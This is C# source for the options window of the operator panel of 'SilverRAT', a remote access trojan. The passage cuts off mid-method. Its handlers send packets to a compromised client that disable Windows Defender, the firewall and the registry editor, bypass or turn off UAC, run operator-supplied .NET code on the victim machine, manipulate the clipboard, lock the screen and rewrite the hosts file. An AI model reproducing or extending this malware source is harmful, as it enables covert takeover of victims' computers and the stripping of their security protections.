using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using SilverRAT.Properties;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class Options : Form
{
    private Dictionary<string, string> providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer Timer1;

    private Panel panelForm;

    private BunifuPages PageOption;

    private Guna2ResizeBox FormResizeBox1;

    private BunifuPanel PanelTitle;

    public BunifuLoader LoaderConnect;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox ImageLogo;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private Panel PaneControll;

    private Guna2Button ButHosts;

    private Guna2Button ButFun;

    private Guna2Button ButAnti;

    private Guna2Button ButMessageBox;

    private Guna2Button ButClipboad;

    private Guna2Button guna2Button_0;

    private Guna2Button ButAdmin;

    private Guna2Button ButSettings;

    private TabPage PageSettings;

    private TabPage PageAdmin;

    private TabPage tabPage_0;

    private TabPage PageClipboard;

    private TabPage PageMessageBox;

    private TabPage PageAnti;

    private TabPage PageFun;

    private TabPage PageHosts;

    private PictureBox pictureBox2;

    public Guna2GradientButton guna2GradientButton_0;

    public Guna2GradientButton guna2GradientButton_1;

    internal Guna2HtmlLabel guna2HtmlLabel6;

    public Guna2GradientButton EnabledRegistry;

    public Guna2GradientButton DisabledRegistry;

    internal Guna2HtmlLabel guna2HtmlLabel5;

    public Guna2GradientButton EnabledAnti;

    public Guna2GradientButton DisabledAnti;

    internal Guna2HtmlLabel guna2HtmlLabel2;

    public Guna2GradientButton EnabledFirewall;

    public Guna2GradientButton DisabledWD;

    internal Guna2HtmlLabel guna2HtmlLabel1;

    public Guna2GradientButton DisabledFirewall;

    internal Guna2HtmlLabel guna2HtmlLabel3;

    public Guna2GradientButton guna2GradientButton_2;

    public Guna2GradientButton guna2GradientButton_3;

    public Guna2GradientButton AddUAC;

    public Guna2GradientButton RunAsadminstartor;

    private BunifuLabel bunifuLabel3;

    public ToolStrip toolStrip1;

    private ToolStripSeparator toolStripSeparator1;

    public ToolStrip TopTols;

    private ToolStripSeparator toolStripSeparator2;

    private ToolStripLabel toolStripLabel3;

    public RichTextBox RixhTextBoxNET;

    public ToolStripComboBox ComboxLanguages;

    private ToolStripButton ReferencesMune;

    public Panel PanelMune;

    private Label MuneClose;

    private BunifuLabel bunifuLabel17;

    public Guna2GradientButton OKReferences;

    public Guna2DataGridView ListReferences;

    private BunifuTextBox TextReferences;

    internal ImageList im;

    private DataGridViewImageColumn Column1;

    private DataGridViewTextBoxColumn Column2;

    private ContextMenuStrip ContectRefrences;

    private ToolStripMenuItem DeleteRefrences;

    public ToolStrip toolStrip2;

    private ToolStripSeparator toolStripSeparator3;

    private ToolStripButton ClipCopy;

    public RichTextBox richTextBoxClipboard;

    private ToolStripButton ClipPaste;

    private ToolStripButton ClipClear;

    public ToolStrip toolStrip3;

    private ToolStripSeparator toolStripSeparator4;

    private ToolStripButton TestMessageBox;

    private ToolStripButton SendMessageBox;

    private ToolStripLabel toolStripLabel1;

    private ToolStripTextBox TitleMessageBox;

    private ToolStripLabel toolStripLabel4;

    public ToolStripComboBox ComTypeMessageBox;

    public RichTextBox RichMesgBox;

    private ToolStripLabel toolStripLabel5;

    public ToolStripComboBox ComIconMessageBox;

    public Guna2DataGridView ListAntiMalware;

    private DataGridViewImageColumn dataGridViewImageColumn1;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn1;

    private ContextMenuStrip ContexAntiMelware;

    private ToolStripMenuItem DeleteProcessAnti;

    public ToolStrip toolStrip4;

    private ToolStripSeparator toolStripSeparator5;

    private ToolStripButton PowerAntimalware;

    private ToolStripLabel toolStripLabel6;

    private ToolStripTextBox TexProcessname;

    private ToolStripButton AddProcessname;

    public Guna2GradientButton MouseRestore;

    internal Guna2HtmlLabel guna2HtmlLabel7;

    public Guna2GradientButton MouseStop;

    public Guna2GradientButton ChagneBackgroundDesktop;

    public Guna2GradientButton ShowTaskbar;

    public Guna2GradientButton HideTaskBar;

    public Guna2GradientButton UnlockScreen;

    private PictureBox ImageIndex;

    public Guna2GradientButton LockedScreen;

    internal Guna2HtmlLabel guna2HtmlLabel9;

    public Guna2GradientButton HideIconDesktop;

    public Guna2GradientButton StardIndex;

    public Guna2GradientButton StopIndex;

    private BunifuTextBox FilenameIndex;

    public ToolStrip toolStrip5;

    private ToolStripSeparator toolStripSeparator6;

    private ToolStripSeparator toolStripSeparator7;

    public RichTextBox TextHosts;

    public BunifuLabel InfoAdmin;

    public BunifuLabel StateAdmin;

    private ToolStripSeparator toolStripSeparator9;

    private ToolStripButton NETTest;

    private ToolStripSeparator toolStripSeparator8;

    private ToolStripButton toolStripButton_0;

    public ToolStripLabel LogsNET;

    internal Guna2HtmlLabel guna2HtmlLabel10;

    public Guna2HtmlLabel StateIndex;

    private ToolStripSeparator toolStripSeparator_0;

    public ToolStripButton SaveHosts;

    public ToolStripLabel LogsHosts;

    public ToolStripButton RefreshHosts;

    public Guna2GradientButton PlayAudio;

    public Guna2GradientButton ShowIconDesktop;

    internal Guna2HtmlLabel guna2HtmlLabel4;

    private BunifuLabel TitlePage;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public bool Admin { get; set; }

    public Options()
    {
        InitializeComponent();
        MinimumSize = base.Size;
        ComTypeMessageBox.SelectedIndex = 0;
        ComIconMessageBox.SelectedIndex = 2;
        ComboxLanguages.SelectedIndex = 0;
    }

    private void Options_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            userIDClient.Split('\\');
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            ListReferences.Rows.Add(im.Images["D.png"], "System.dll");
            ListReferences.Rows.Add(im.Images["D.png"], "System.Windows.Forms.dll");
            ListReferences.Rows.Add(im.Images["D.png"], "Microsoft.VisualBasic.dll");
            ListReferences.Rows.Add(im.Images["D.png"], "System.Management.dll");
            ListReferences.Rows.Add(im.Images["D.png"], "System.Drawing.dll");
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void Options_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void ButSettings_Click(object sender, EventArgs e)
    {
        PageOption.SelectedIndex = 0;
        TitlePage.Text = "Settings";
    }

    private void ButAdmin_Click(object sender, EventArgs e)
    {
        PageOption.SelectedIndex = 1;
        TitlePage.Text = "Admin";
    }

    private void ButDotNET_Click(object sender, EventArgs e)
    {
        PageOption.SelectedIndex = 2;
        TitlePage.Text = "Dot Net Editor";
    }

    private void ButClipboad_Click(object sender, EventArgs e)
    {
        PageOption.SelectedIndex = 3;
        TitlePage.Text = "Clipboard";
    }

    private void ButMessageBox_Click(object sender, EventArgs e)
    {
        PageOption.SelectedIndex = 4;
        TitlePage.Text = "Message Box";
    }

    private void ButAnti_Click(object sender, EventArgs e)
    {
        PageOption.SelectedIndex = 5;
        TitlePage.Text = "Anti Malware";
    }

    private void ButFun_Click(object sender, EventArgs e)
    {
        PageOption.SelectedIndex = 6;
        TitlePage.Text = "Fun";
    }

    private void ButHosts_Click(object sender, EventArgs e)
    {
        PageOption.SelectedIndex = 7;
        TitlePage.Text = "Hosts";
    }

    private void DisabledWD_Click(object sender, EventArgs e)
    {
        if (!Admin)
        {
            MessageBox.Show(this, "This feature requires administrator privileges, please run the client as an administrator", "Hidden RDP!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            return;
        }
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "DisabledWD";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            DisabledWD.Enabled = false;
        }
        catch
        {
        }
    }

    private void DisabledFirewall_Click(object sender, EventArgs e)
    {
        if (!Admin)
        {
            MessageBox.Show(this, "This feature requires administrator privileges, please run the client as an administrator", "Hidden RDP!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            return;
        }
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "DisabledFireWall";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            DisabledFirewall.Enabled = false;
        }
        catch
        {
        }
    }

    private void EnabledFirewall_Click(object sender, EventArgs e)
    {
        if (!Admin)
        {
            MessageBox.Show(this, "This feature requires administrator privileges, please run the client as an administrator", "Hidden RDP!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            return;
        }
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "EnabledFirewall";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            EnabledFirewall.Enabled = false;
        }
        catch
        {
        }
    }

    private void DisabledAnti_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "AntiStop";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            DisabledAnti.Enabled = false;
        }
        catch
        {
        }
    }

    private void EnabledAnti_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "AntiStart";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            EnabledAnti.Enabled = false;
        }
        catch
        {
        }
    }

    private void DisabledUAC_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "DisabledUAC";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            guna2GradientButton_1.Enabled = false;
        }
        catch
        {
        }
    }

    private void EnabledUAC_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "EnabledUAC";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            guna2GradientButton_0.Enabled = false;
        }
        catch
        {
        }
    }

    private void DisabledRegistry_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "DesabledRegistry";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            DisabledRegistry.Enabled = false;
        }
        catch
        {
        }
    }

    private void EnabledRegistry_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "EnabledRegistry";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            EnabledRegistry.Enabled = false;
        }
        catch
        {
        }
    }

    private void BypassUAC_Click(object sender, EventArgs e)
    {
        try
        {
            if (Admin)
            {
                MessageBox.Show(this, "Already this client is running as administrator", "Options | Admin!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1);
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "BybassUAC";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            guna2GradientButton_3.Enabled = false;
        }
        catch
        {
        }
    }

    private void RunAsadminstartor_Click(object sender, EventArgs e)
    {
        try
        {
            if (Admin)
            {
                MessageBox.Show(this, "Already this client is running as administrator", "Options | Admin!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1);
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "RunAs";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            RunAsadminstartor.Enabled = false;
        }
        catch
        {
        }
    }

    private void AddUAC_Click(object sender, EventArgs e)
    {
        try
        {
            if (Admin)
            {
                MessageBox.Show(this, "This feature requires administrator privileges, please run the client as an administrato!", "Options | Admin!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "AddUAC";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            AddUAC.Enabled = false;
        }
        catch
        {
        }
    }

    private void ExcuteUAC_Click(object sender, EventArgs e)
    {
        try
        {
            if (Admin)
            {
                MessageBox.Show(this, "Already this client is running as administrator", "Options | Admin!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1);
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "ExcuteUAC";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            guna2GradientButton_2.Enabled = false;
        }
        catch
        {
        }
    }

    private void StateAdmin_Click(object sender, EventArgs e)
    {
        StateAdmin.Text = "--";
        StateAdmin.ForeColor = Color.Black;
    }

    private void NETTest_Click(object sender, EventArgs e)
    {
        if (ListReferences.Rows.Count == 0 || string.IsNullOrWhiteSpace(RixhTextBoxNET.Text))
        {
            return;
        }
        if (!RixhTextBoxNET.Text.ToLower().Contains("try") && !RixhTextBoxNET.Text.ToLower().Contains("catch"))
        {
            MessageBox.Show("Please add try catch", "Options | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
        List<string> list = new List<string>();
        foreach (DataGridViewRow item in (IEnumerable)ListReferences.Rows)
        {
            if (!item.IsNewRow)
            {
                list.Add(item.Cells[1].Value.ToString());
            }
        }
        switch (ComboxLanguages.SelectedIndex)
        {
            case 1:
                Compiler(new VBCodeProvider(providerOptions), RixhTextBoxNET.Text, string.Join(",", list).Split(new string[1] { "," }, StringSplitOptions.RemoveEmptyEntries));
                break;
            case 0:
                Compiler(new CSharpCodeProvider(providerOptions), RixhTextBoxNET.Text, string.Join(",", list).Split(new string[1] { "," }, StringSplitOptions.RemoveEmptyEntries));
                break;
        }
    }

    private void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
    {
        try
        {
            new Dictionary<string, string>().Add("CompilerVersion", "v4.0");
            string compilerOptions = "/target:winexe /platform:anycpu /optimize-";
            CompilerParameters options = new CompilerParameters(referencedAssemblies)
            {
                GenerateExecutable = true,
                GenerateInMemory = true,
                CompilerOptions = compilerOptions,
                TreatWarningsAsErrors = false,
                IncludeDebugInformation = false
            };
            CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(options, source);
            if (compilerResults.Errors.Count > 0)
            {
                IEnumerator enumerator = compilerResults.Errors.GetEnumerator();
                try
                {
                    if (enumerator.MoveNext())
                    {
                        CompilerError compilerError = (CompilerError)enumerator.Current;
                        MessageBox.Show($"{compilerError.ErrorText}\nLine: {compilerError.Line}", "Options | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }
                    return;
                }
                finally
                {
                    IDisposable disposable = enumerator as IDisposable;
                    if (disposable != null)
                    {
                        disposable.Dispose();
                    }
                }
            }
            compilerResults = null;
            MessageBox.Show("No Error!", "Options | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Options | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
        finally
        {
        }
    }

    private string GetCode(string lang)
    {
        if (!(lang == "0"))
        {
            if (!(lang == "1"))
            {
                return "";
            }
            return "Imports System\r\nImports System.Windows.Forms\r\n\r\nNamespace SilverRAT\r\n    Public Class Program\r\n        Public Shared Sub Main(ByVal args As String())\r\n            Try\r\n                MessageBox.Show(\"Hello World\")\r\n            Catch\r\n            End Try\r\n        End Sub\r\n    End Class\r\nEnd Namespace\r\n\r\n";
        }
        return "using System;\r\nusing System.Windows.Forms;\r\nnamespace SilverRAT\r\n{\r\n    public class Program\r\n    {\r\n        public static void Main(string[] args)\r\n        {\r\n            try\r\n            {\r\n                MessageBox.Show(\"Hello World\");\r\n            }\r\n            catch { }\r\n        }\r\n    }\r\n}";
    }

    private void ComboxLanguages_SelectedIndexChanged(object sender, EventArgs e)
    {
        RixhTextBoxNET.Text = GetCode(ComboxLanguages.SelectedIndex.ToString());
    }

    private void NETExcute_Click(object sender, EventArgs e)
    {
        if (ListReferences.Rows.Count == 0 || string.IsNullOrWhiteSpace(RixhTextBoxNET.Text))
        {
            return;
        }
        if (!RixhTextBoxNET.Text.ToLower().Contains("try") && !RixhTextBoxNET.Text.ToLower().Contains("catch"))
        {
            MessageBox.Show("Please add try catch", "SilverRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
        List<string> list = new List<string>();
        foreach (DataGridViewRow item in (IEnumerable)ListReferences.Rows)
        {
            if (!item.IsNewRow)
            {
                list.Add(item.Cells[1].Value.ToString());
            }
        }
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "ExecuteDotNetCode";
        msgPack.ForcePathObject("Languages").AsString = ComboxLanguages.Text;
        msgPack.ForcePathObject("Code").AsString = RixhTextBoxNET.Text;
        msgPack.ForcePathObject("Reference").AsString = string.Join(",", list);
        ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        MessageBox.Show("Executed!", "SilverRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void LogsNET_Click(object sender, EventArgs e)
    {
        LogsNET.Text = "...";
        LogsNET.ForeColor = Color.Black;
    }

    private void TextReferences_OnIconRightClick(object sender, EventArgs e)
    {
        try
        {
            if (string.IsNullOrEmpty(TextReferences.Text))
            {
                MessageBox.Show(this, "Please add dll library name", "Options | Dot Net Editor!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            if (!TextReferences.Text.Contains(".dll"))
            {
                MessageBox.Show(this, "Please add dll library name!", "Options | Dot Net Editor!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            ListReferences.Rows.Add(im.Images["D.png"], TextReferences.Text);
            TextReferences.Clear();
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Options | Dot Net Editor!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    private void DeleteRefrences_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in ListReferences.SelectedRows)
            {
                ListReferences.Rows.Remove(selectedRow);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Options | Dot Net Editor!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    private void MuneClose_Click(object sender, EventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(PanelMune);
    }

    private void OKReferences_Click(object sender, EventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(PanelMune);
    }

    private void ReferencesMune_Click(object sender, EventArgs e)
    {
        if (!PanelMune.Visible)
        {
            Program.Silver.TransitionShowng.ShowSync(PanelMune);
        }
    }

    private void ClipCopy_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Copy";
            msgPack.ForcePathObject("txt").AsString = richTextBoxClipboard.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void ClipPaste_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Paste";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void ClipClear_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Claen";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    public string Messageicon()
    {
        string result = "";
        if (ComIconMessageBox.SelectedIndex == 0)
        {
            result = "1";
        }
        else if (ComIconMessageBox.SelectedIndex == 1)
        {
            result = "2";
        }
        else if (ComIconMessageBox.SelectedIndex == 2)
        {
            result = "3";
        }
        else if (ComIconMessageBox.SelectedIndex == 3)
        {
            result = "4";
        }
        return result;
    }

    public string Messagebutton()
    {
        string result = "";
        if (ComTypeMessageBox.SelectedIndex == 0)
        {
            result = "1";
        }
        else if (ComTypeMessageBox.SelectedIndex == 1)
        {
            result = "2";
        }
        else if (ComTypeMessageBox.SelectedIndex == 2)
        {
            result = "3";
        }
        else if (ComTypeMessageBox.SelectedIndex == 3)
        {
            result = "4";
        }
        else if (ComTypeMessageBox.SelectedIndex == 4)
        {
            result = "5";
        }
        else if (ComTypeMessageBox.SelectedIndex == 5)
        {
            result = "6";
        }
        return result;
    }

    private void TestMessageBox_Click(object sender, EventArgs e)
    {
        MessageBox.Show(icon: (ComIconMessageBox.SelectedIndex == 0) ? MessageBoxIcon.Asterisk : ((ComIconMessageBox.SelectedIndex == 1) ? MessageBoxIcon.Question : ((ComIconMessageBox.SelectedIndex == 2) ? MessageBoxIcon.Exclamation : ((ComIconMessageBox.SelectedIndex != 3) ? MessageBoxIcon.Asterisk : MessageBoxIcon.Hand))), buttons: (ComTypeMessageBox.SelectedIndex == 0) ? MessageBoxButtons.YesNo : ((ComTypeMessageBox.SelectedIndex == 1) ? MessageBoxButtons.YesNoCancel : ((ComTypeMessageBox.SelectedIndex != 2) ? ((ComTypeMessageBox.SelectedIndex == 3) ? MessageBoxButtons.OKCancel : ((ComTypeMessageBox.SelectedIndex == 4) ? MessageBoxButtons.RetryCancel : ((ComTypeMessageBox.SelectedIndex == 5) ? MessageBoxButtons.AbortRetryIgnore : MessageBoxButtons.OK))) : MessageBoxButtons.OK)), owner: this, text: RichMesgBox.Text, caption: TitleMessageBox.Text);
    }

    private void SendMessageBox_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Message";
            msgPack.ForcePathObject("messageicon").AsString = Messageicon();
            msgPack.ForcePathObject("messagebutton").AsString = Messagebutton();
            msgPack.ForcePathObject("title").AsString = TitleMessageBox.Text;
            msgPack.ForcePathObject("MsgBox").AsString = RichMesgBox.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void AddProcessname_Click(object sender, EventArgs e)
    {
        try
        {
            if (TexProcessname.Text.ToLower().Contains(".exe"))
            {
                MessageBox.Show(this, "Please enter the process name without extension!", "Options | AntiMalware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            ListAntiMalware.Rows.Add(im.Images["Anti.png"], TexProcessname.Text);
            TexProcessname.Clear();
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Options | AntiMalware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    private void DeleteProcessAnti_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in ListAntiMalware.SelectedRows)
            {
                ListAntiMalware.Rows.Remove(selectedRow);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Options | AntiMalware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    private void PowerAntimalware_Click(object sender, EventArgs e)
    {
        try
        {
            if (PowerAntimalware.Text == "Start")
            {
                if (ListAntiMalware.Rows.Count == 0)
                {
                    MessageBox.Show(this, "Please add the names of the processes you want to block in the list", "Options | AntiMalware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                    return;
                }
                string text = string.Empty;
                foreach (DataGridViewRow item in (IEnumerable)ListAntiMalware.Rows)
                {
                    if (!item.IsNewRow)
                    {
                        text = text + item.Cells[1].Value.ToString() + ",";
                    }
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "AntiMalwareStart";
                msgPack.ForcePathObject("ListProcess").AsString = text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                PowerAntimalware.Text = "Stop";
                ListAntiMalware.Enabled = false;
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "AntiMalwareStop";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                PowerAntimalware.Text = "Start";
                ListAntiMalware.Enabled = true;
            }
        }
        catch
        {
        }
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void Options_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
            {
                ThreadPool.QueueUserWorkItem(delegate
                {
                    Client?.Disconnected();
                });
                Close();
            }
        }
        catch
        {
        }
    }

    private void FilenameIndex_OnIconRightClick(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Choose Image";
            openFileDialog.Filter = "File (*.jpg)|*.jpg|File (*.jpeg)|*.jpeg|File (*.gif)|*.gif|File (*.png)|*.png|File (*.bmp)|*.bmp|All Files (*.*)|*.*";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FilenameIndex.Text = openFileDialog.FileName;
                ImageIndex.Image = Image.FromFile(openFileDialog.FileName);
            }
            else
            {
                FilenameIndex.Text = "";
                ImageIndex.Image = Resources.ImageIndex;
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Options! | Fun", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    private void StardIndex_Click(object sender, EventArgs e)
    {
        try
        {
            if (string.IsNullOrEmpty(FilenameIndex.Text))
            {
                MessageBox.Show("Please select an image!", "Options! | Fun", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            if (!File.Exists(FilenameIndex.Text))
            {
                MessageBox.Show("The specified image path is invalid!", "Options! | Fun", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "IndexStart";
            msgPack.ForcePathObject("Exc").AsString = new FileInfo(FilenameIndex.Text).Extension;
            msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(FilenameIndex.Text));
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            StardIndex.Enabled = false;
        }
        catch
        {
        }
    }

    private void StopIndex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "IndexStop";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            StopIndex.Enabled = false;
        }
        catch
        {
        }
    }

    private void SaveHosts_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Admin)
            {
                MessageBox.Show(this, "This feature requires administrator privileges, please run the client as an administrator", "Options! | Hosts", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "SaveHosts";
            msgPack.ForcePathObject("Hosts").AsString = TextHosts.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            SaveHosts.Enabled = false;
        }
        catch
        {
        }
    }

    private void RefreshHosts_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "GetHosts";
